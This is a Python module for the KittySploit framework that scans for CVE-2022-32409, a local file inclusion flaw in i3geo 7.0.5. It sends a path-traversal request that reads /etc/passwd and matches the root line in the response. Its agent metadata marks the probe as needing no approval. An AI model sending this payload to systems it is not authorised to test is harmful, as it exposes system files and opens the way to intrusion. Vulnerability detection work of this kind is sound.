#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Portal do Software Publico Brasileiro i3geo 7."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Portal do Software Publico Brasileiro i3geo 7.0.5 - Local File Inclusion Detection',
        'description': 'Portal do Software Publico Brasileiro i3geo 7.0.5 is vulnerable to local file inclusion in the component codemirror.php, which allows attackers to execute arbitrary PHP code via a crafted HTTP request.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'i3geo', 'lfi', 'softwarepublico', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/wagnerdracha/ProofOfConcept/blob/main/i3geo_proof_of_concept.txt',
            'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-32409',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2022-32409',
    }

    def run(self):
        r = self.http_request(method="GET", path='/i3geo/exemplos/codemirror.php?&pagina=../../../../../../../../../../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='critical',
                reason="Portal do Software Publico Brasileiro i3geo 7.0.5 - Local File Inclusion detected",
                path='/i3geo/exemplos/codemirror.php?&pagina=../../../../../../../../../../../../../../../../../etc/passwd',
            )
            return True
        return False

